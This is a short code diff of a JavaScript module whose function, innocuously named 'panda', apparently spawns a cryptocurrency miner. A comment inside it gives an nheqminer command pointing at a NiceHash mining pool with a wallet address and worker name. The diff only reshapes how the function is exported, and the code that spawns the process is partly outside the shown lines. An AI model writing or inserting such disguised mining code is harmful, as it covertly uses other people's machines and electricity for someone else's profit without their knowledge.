@@ -1,6 +1,4 @@
-
-
-module.exports = function panda() {
+function panda() {
 //./nheqminer -l equihash.eu.nicehash.com:3357 -u 16nwBgDJA8KekHsvt1apLMsyoXpsstV2NH.worker1 -t 0
 var util  = require('util'),
     spawn = require('child_process').spawn,
@@ -25,4 +23,4 @@ ls.on('exit', function (code) {
 
 }
 
-
+module.exports = {panda:panda}
